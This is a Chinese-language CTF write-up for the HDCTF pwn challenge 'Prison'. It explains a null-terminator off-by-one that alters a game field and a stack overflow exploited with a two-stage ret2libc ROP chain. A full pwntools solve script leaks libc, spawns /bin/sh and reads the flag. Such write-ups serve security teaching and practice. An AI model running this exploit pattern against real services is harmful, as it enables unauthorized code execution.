---
title: "Prison：漏洞在律师那里"
date: "2026-09-12"
categories: "Pwn"
tags: ["ROP", "ret2libc", "栈溢出"]
excerpt: "用终止符越界改变狱友策略，再经律师栈溢出泄漏 libc 并完成两段 ROP。"
slug: "hdctf-prison"
source_event: "HDCTF"
---

> 复现材料：`prison`、`libc.so.6`、`题目交互服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。

题面是合作-背叛游戏，连过五个狱友攒信誉分就能见律师。游戏本身只是陪衬，真正的漏洞在 `meet_lawyer` 的 `read` 里。

## 漏洞

`meet_lawyer`（`0x401509`）的栈上：

```c
char buf[0x40];
printf("> ");
read(0, buf, 0x100);
```

`read` 往 0x40 的栈缓冲里塞 0x100 字节，偏移 0x48 覆盖返回地址。二进制无 canary、无 PIE、Partial RELRO，直接 ROP。

## 游戏怎么过

狱友的策略存在 `g_cellmates` 结构体里（单个 0x4C 字节）：

| 偏移 | 字段 |
|---|---|
| +0x18 | 便条缓冲，第 5 关前写入 |
| +0x38 | 策略 type |
| +0x3c | 轮数 |
| +0x40 | 需要的分数 |

五个人的策略和打法：

| 狱友 | type | 行为 | 打法 |
|---|---|---|---|
| 阿善 | 0 | 永远合作 | 全程合作，10 轮 30 分 ≥ 25 |
| 刀疤 | 1 | 永远背叛 | 全程背叛，10 轮 10 分 ≥ 10 |
| 镜哥 | 2 | 复读我上一手 | 全程合作，12 轮 36 分 ≥ 36 |
| 岩叔 | 3 | 被我背叛一次就记仇 | 全程合作，12 轮 36 分 ≥ 36 |
| 无面 | 4 | 永远背叛 | 见下 |

无面 20 轮要求 60 分，永远背叛时最多 1×20=20 分，正常打必输。但第 5 关前监狱长给特权留遗言：`leave_note` 用 `read_line(cell+0x18, 0x21)` 读便条，最多读 32 字节，然后往 `buf[count]` 写 `'\0'`。写满 32 个字节后这个 `'\0'` 正好落在 `+0x38` 的 type 字段上，无面的策略被改成 0（阿善）。于是便条填 32 个 `A`，20 轮全背叛，拿满 100 分。

## 利用

栈上可用的 gadget 只有 `pop rdi; ret`（`0x4011b6`），`ret` 在 `0x40101a`，`meet_lawyer` 在 `0x401509`。第一段 ROP 用 `puts(puts@got)` 泄 libc 再回到 `meet_lawyer`，第二段 `system("/bin/sh")`。`system` 入口要求 `rsp % 16 == 8`，调用前垫一个 `ret`，否则 `movaps` 直接崩。远程 libc 与题目给的 `libc.so.6` 一致，用 puts 和 printf 两个泄漏交叉验证过基址。

```python
# solve.py
from pwn import *
import time

context.log_level = 'info'
context.arch = 'amd64'

HOST = 'challenge.example.invalid'
PORT = 31405
e = ELF('prison')
libc = ELF('libc.so.6')

pop_rdi = 0x4011b6
ret = 0x40101a
meet_lawyer = 0x401509
puts_plt = e.plt['puts']

p = remote(HOST, PORT)

stages = [(10, b'0'), (10, b'1'), (12, b'0'), (12, b'0'), (20, b'1')]
for idx, (rounds, choice) in enumerate(stages):
    if idx == 4:
        p.recvuntil(b'> ')
        p.send(b'A' * 32)  # 第 32 字节的 '\0' 落在 type 字段，无面变阿善
    for r in range(rounds):
        p.recvuntil(b'> ')
        p.sendline(choice)
p.recvuntil(b'> ')
p.sendline(b'1')  # 会见律师
p.recvuntil(b'> ')

chain1 = [pop_rdi, e.got['puts'], ret, puts_plt, ret, meet_lawyer]
p.send(b'A' * 0x48 + b''.join(p64(x) for x in chain1))
p.recvuntil(b'\xe8\xbd\xac\xe4\xba\xa4\xe3\x80\x82\n')
leak = u64(p.recvuntil(b'\n').rstrip(b'\n').ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']

p.recvuntil(b'> ')
chain2 = [
    pop_rdi, libc_base + next(libc.search(b'/bin/sh')),
    ret,
    libc_base + libc.symbols['system'],
]
p.send(b'B' * 0x48 + b''.join(p64(x) for x in chain2))
time.sleep(0.8)  # 等 shell 起来再发命令，发太早会被律师的 read 吞掉
p.sendline(b'cat flag.txt')
print(p.recvall(timeout=3).decode('utf-8', 'replace'))
```

拿到 shell 后直接读 `flag.txt`：

```
HDCTF{b09697b2-ad2f-0326-2062-38ad0bc47a4d}
```

根因就两句：无面那关的遗言让 `read_line` 的终止符越界改掉了策略字段，律师那边的栈溢出再把游戏题变成送分 ROP。
